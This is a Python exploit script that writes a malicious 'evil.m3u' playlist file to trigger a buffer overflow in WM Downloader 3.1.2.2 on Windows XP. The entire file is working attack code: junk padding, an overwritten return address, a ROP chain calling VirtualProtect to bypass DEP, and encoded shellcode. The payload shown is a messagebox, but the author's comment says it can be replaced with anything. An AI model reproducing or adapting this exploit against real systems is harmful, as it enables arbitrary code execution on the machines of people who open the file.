#!/usr/bin/env python
# WM Downloader 3.1.2.2 2010.04.15 (.m3u) Buffer Overflow + DEP Bypass
# Author: sickness
# Download : http://mini-stream.net/wm-downloader/
# Tested : Windows XP Professional SP3 (EN) latest updates with IE8 and IE7
# DATE   : 29/01/2011
###################################################################
# You might need to change the offset.
# The payload can be replaced with whatever you want, there is enough space.
# 
# Hello corelanc0d3r!
# http://redmine.corelan.be:8800/projects/pvefindaddr
###################################################################

import sys

header='#EXTM3U\n'
junk ='http://'+'\x90' * 17400
junk+='\x41'*17
eip  ='\x1E\x17\x80\x7C'	# RETN
junk2='\x41\x41\x41\x41' 


rop ='\x77\x92\xD7\x5A'	# PUSH ESP # MOV EAX,EDX # POP EDI # RETN
rop+='\x42\xE8\xC1\x77'	# PUSH EDI # POP EAX # POP EBP # RETN
rop+='\x41\x41\x41\x41'	# POP EBP
rop+='\xBB\xA5\x72\x74'	# INC ESI # PUSH EAX # POP ESI # POP EBP # RETN 4
rop+='\x41\x41\x41\x41' # POP EBP
rop+='\x94\x28\xC2\x77'	# ADD ESP,20 # POP EBP # RETN
rop+='\x41\x41\x41\x41'	# RETN 4
rop+='\x41\x41\x41\x41'	# POP EBP

vp ='\xD4\x1A\x80\x7C'	# VirtualProtect()
vp+='WWWW'		# SC
vp+='XXXX'		# SC
vp+='YYYY'		# Size
vp+='ZZZZ'		# Policy
vp+='\xD0\x23\x10\x5D'	# Writable Memory
vp+='\x41\x41\x41\x41'	# Compensate ADD ESP,20
vp+='\x41\x41\x41\x41'	# Compensate ADD ESP,20

rop2 ='\x2B\xEC\xC4\x77'		# ADD EAX,100 # POP EBP # RETN
rop2+='\x41\x41\x41\x41'	# POP EBP
rop2+='\xF5\xD7\xC1\x77'	# ADD EAX,20 # POP EBP # RETN
rop2+='\x41\x41\x41\x41'	# POP EBP
rop2+='\xF5\xD7\xC1\x77'	# ADD EAX,20 # POP EBP # RETN
rop2+='\x41\x41\x41\x41'	# POP EBP
rop2+='\xF5\xD7\xC1\x77'	# ADD EAX,20 # POP EBP # RETN
rop2+='\x41\x41\x41\x41'	# POP EBP
rop2+='\x1F\xC1\xDD\x73'	# MOV DWORD PTR DS:[ESI+20],EAX # POP ESI # RETN
rop2+='\x41\x41\x41\x41'	# POP ESI
rop2+='\x42\xE8\xC1\x77'	# PUSH EDI # POP EAX # POP EBP # RETN
rop2+='\x41\x41\x41\x41'	# POP EBP
rop2+='\xBB\xA5\x72\x74'	# INC ESI # PUSH EAX # POP ESI # POP EBP # RETN 4
rop2+='\x41\x41\x41\x41' 	# POP EBP
rop2+='\x2B\xEC\xC4\x77'	# ADD EAX,100 # POP EBP # RETN
rop2+='\x41\x41\x41\x41' 	# POP RETN 4
rop2+='\x41\x41\x41\x41'	# POP EBP
rop2+='\xF5\xD7\xC1\x77'	# ADD EAX,20 # POP EBP # RETN
rop2+='\x41\x41\x41\x41'	# POP EBP
rop2+='\xF5\xD7\xC1\x77'	# ADD EAX,20 # POP EBP # RETN
rop2+='\x41\x41\x41\x41'	# POP EBP
rop2+='\xF5\xD7\xC1\x77'	# ADD EAX,20 # POP EBP # RETN
rop2+='\x41\x41\x41\x41'	# POP EBP'
rop2+='\xCF\x43\xDD\x73'	# MOV DWORD PTR DS:[ESI+24],EAX # POP ESI # RETN
rop2+='\x41\x41\x41\x41'	# POP ESI
rop2+='\x42\xE8\xC1\x77'	# PUSH EDI # POP EAX # POP EBP # RETN
rop2+='\x41\x41\x41\x41'	# POP EBP
rop2+='\xBB\xA5\x72\x74'	# INC ESI # PUSH EAX # POP ESI # POP EBP # RETN 4
rop2+='\x41\x41\x41\x41' 	# POP EBP
rop2+='\xC3\xA9\xE5\x73'	# XOR EAX,EAX # POP EBP # RETN
rop2+='\x41\x41\x41\x41'	# RETN 4
rop2+='\x41\x41\x41\x41'	# POP EBP
rop2+='\x2B\xEC\xC4\x77'	# ADD EAX,100 # POP EBP # RETN
rop2+='\x41\x41\x41\x41'	# POP EBP
rop2+='\x2B\xEC\xC4\x77'	# ADD EAX,100 # POP EBP # RETN
rop2+='\x41\x41\x41\x41'	# POP EBP
rop2+='\x2B\xEC\xC4\x77'	# ADD EAX,100 # POP EBP # RETN
rop2+='\x41\x41\x41\x41'	# POP EBP
rop2+='\x2B\xEC\xC4\x77'	# ADD EAX,100 # POP EBP # RETN
rop2+='\x41\x41\x41\x41'	# POP EBP
rop2+='\x2B\xEC\xC4\x77'	# ADD EAX,100 # POP EBP # RETN
rop2+='\x41\x41\x41\x41'	# POP EBP
rop2+='\x46\x21\xE1\x73'	# MOV DWORD PTR DS:[ESI+28],EAX # POP ESI # RETN
rop2+='\x41\x41\x41\x41'	# POP ESI
rop2+='\x42\xE8\xC1\x77'	# PUSH EDI # POP EAX # POP EBP # RETN
rop2+='\x41\x41\x41\x41'	# POP EBP
rop2+='\xBB\xA5\x72\x74'	# INC ESI # PUSH EAX # POP ESI # POP EBP # RETN 4
rop2+='\x41\x41\x41\x41' 	# POP EBP
rop2+='\xC3\xA9\xE5\x73'	# XOR EAX,EAX # POP EBP # RETN
rop2+='\x41\x41\x41\x41'	# RETN 4
rop2+='\x41\x41\x41\x41'	# POP EBP
rop2+='\x1D\xEC\xC4\x77'	# ADD EAX,40 # POP EBP # RETN
rop2+='\x41\x41\x41\x41'	# POP EBP
rop2+='\x1D\x7D\x15\x77'	# INC ESI # RETN
rop2+='\x1D\x7D\x15\x77'	# INC ESI # RETN
rop2+='\x1D\x7D\x15\x77'	# INC ESI # RETN
rop2+='\x1D\x7D\x15\x77'	# INC ESI # RETN
rop2+='\x46\x21\xE1\x73'	# MOV DWORD PTR DS:[ESI+28],EAX # POP ESI # RETN
rop2+='\x41\x41\x41\x41'	# POP ESI
rop2+='\x42\xE8\xC1\x77'	# PUSH EDI # POP EAX # POP EBP # RETN
rop2+='\x41\x41\x41\x41'	# POP EBP
rop2+='\x1D\x2D\xE2\x73'	# ADD EAX,4 # RETN
rop2+='\x1D\x2D\xE2\x73'	# ADD EAX,4 # RETN
rop2+='\x1D\x2D\xE2\x73'	# ADD EAX,4 # RETN
rop2+='\x1D\x2D\xE2\x73'	# ADD EAX,4 # RETN
rop2+='\x1D\x2D\xE2\x73'	# ADD EAX,4 # RETN
rop2+='\x1D\x2D\xE2\x73'	# ADD EAX,4 # RETN
rop2+='\xB1\x9C\x5C\x75'	# PUSH EAX # POP EBP # RETN 4
rop2+='\x26\x25\xAA\x71'	# MOV ESP,EBP # POP EBP # RETN
rop2+='\x41\x41\x41\x41'	# RETN 4
rop2+='\x41\x41\x41\x41'	# POP EBP


# msfpayload windows/messagebox TITLE=OWNED TEXT="Feel the pwnsauce." R | msfencode -a x86 -b '\x00\x0a\x0d\x20\x25\x09' -t c
sc = ("\xd9\xe5\xd9\x74\x24\xf4\x5d\xb8\xe9\xf2\x97\x0f\x29\xc9\xb1"
"\x43\x31\x45\x18\x03\x45\x18\x83\xed\x15\x10\x62\xd6\x0e\x4e"
"\x54\x9d\xf4\x85\x56\x8c\x46\x12\xa8\xf9\xc2\x56\xbb\xc9\x81"
"\x1f\x30\xa1\xe3\xc3\xc3\xf3\x03\x77\xad\xdb\x98\xb1\x6a\x53"
"\x86\xc8\x79\x32\xb7\xe3\x81\x24\xd7\x88\x12\x83\x33\x04\xaf"
"\xf7\xb0\x4e\x18\x70\xc7\x84\xd3\xca\xdf\xd3\xbe\xea\xde\x08"
"\xdd\xdf\xa9\x45\x16\xab\x28\xb4\x66\x54\x1b\x88\x75\x06\xdf"
"\xc8\xf2\x50\x1e\x07\xf7\x5f\x67\x73\xfc\x5b\x1b\xa0\xd5\xee"
"\x02\x23\x7f\x35\xc5\xdf\xe6\xbe\xc9\x54\x6c\x9a\xcd\x6b\x99"
"\x90\xe9\xe0\x5c\x4f\x78\xb2\x7a\x93\x1b\xf8\x31\xa3\xf2\x2a"
"\xbc\x51\x8d\x11\xd7\x17\xc3\x9b\xc4\x7a\x33\x3c\xeb\x84\x3c"
"\xca\x51\x7f\x79\xb3\x81\x9d\x0e\xcb\x2e\x46\xa2\x3b\xc0\x79"
"\xbd\x43\x54\xc0\x49\xd4\x0b\xa7\x69\x65\xbc\x04\x5b\x4b\x58"
"\x03\xee\xe0\xc5\xa1\x98\x5b\x22\x4c\x11\x85\x7c\xaf\x74\x4e"
"\x08\x8d\x26\xf5\xa2\xb0\x8b\xb5\x34\xa8\x37\x94\xd2\xb0\xc8"
"\xe7\xdc\x5b\x72\x40\x03\xbc\x12\x3f\x14\xf2\xa7\x8e\x41\x82"
"\x7b\xd5\x70\x1a\x60\x7d\x1e\x32\x3e\x5e\x88\x39\xdf\xeb\x2b"
"\xd6\x3f\x64\xdb\x48\x57\xa4\x57\xfd\xc2\xcc\xd1\x98\x69\x61"
"\xef\xab\xf9\x35\x2b\x3e\x70\x24\x02\xec\xd0\xf4\x34\x42\x2b"
"\x2a\x87\xa2\x83\x34\xbd\x2a")

nops = '\x90' * 150
rest = '\x90' * 3600

exploit =header+junk+eip+junk2+rop+vp+rop2+nops+sc+rest

file = open('evil.m3u','w')
file.write(exploit)
file.close()
print 'Writing file, please wait ...\n'
print 'Done!'
